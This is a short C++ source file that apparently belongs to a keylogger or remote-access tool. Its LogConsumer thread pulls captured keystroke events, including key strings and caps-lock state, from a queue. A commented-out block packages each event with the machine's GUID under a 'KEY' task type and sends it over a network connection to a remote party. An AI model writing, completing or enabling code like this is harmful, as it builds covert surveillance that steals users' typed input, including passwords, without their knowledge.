#include "log_consumer.h"

LogConsumer::LogConsumer(std::shared_ptr<Connection> conn)
    :
    conn_(std::move(conn))
{

}

LogConsumer::~LogConsumer()
{ 
    stop();
}

void LogConsumer::loop(std::stop_token st)
{  
    while (!st.stop_requested()) {
        std::cout << "waiting for log_sem..." << "\n";
        json::object j;
        log_sem.acquire();

        {
            std::lock_guard<std::mutex> lk(log_m);
            j["timeStamp"] = log_q.front().timeStamp;
            j["capsLock"] = log_q.front().capsLock;
            j["eventType"] = log_q.front().eventType;
            j["keyString"] = log_q.front().keyString;
            log_q.pop();
        }
        /*
        std::cout << j["timeStamp"] << "\n";
        std::cout << j["capsLock"] << "\n";
        std::cout << j["eventType"] << "\n";
        std::cout << j["keyString"] << "\n";
        json::object resp;
        resp["prefix"] = "EVENT";
        resp["machineGuid"] = getSpec().machine_guid;
        resp["taskType"] = "KEY";
        resp["payload"] = json::serialize(j);

        conn_->send(json::serialize(resp));
        */
    }
}

void LogConsumer::start()
{ 
    if (t_.joinable()) return;

    t_ = std::jthread([this](std::stop_token st) {
        loop(st);
        });
}

void LogConsumer::stop()
{ 
    if (t_.joinable()) {
        t_.request_stop();
        t_ = std::jthread();
   }
}
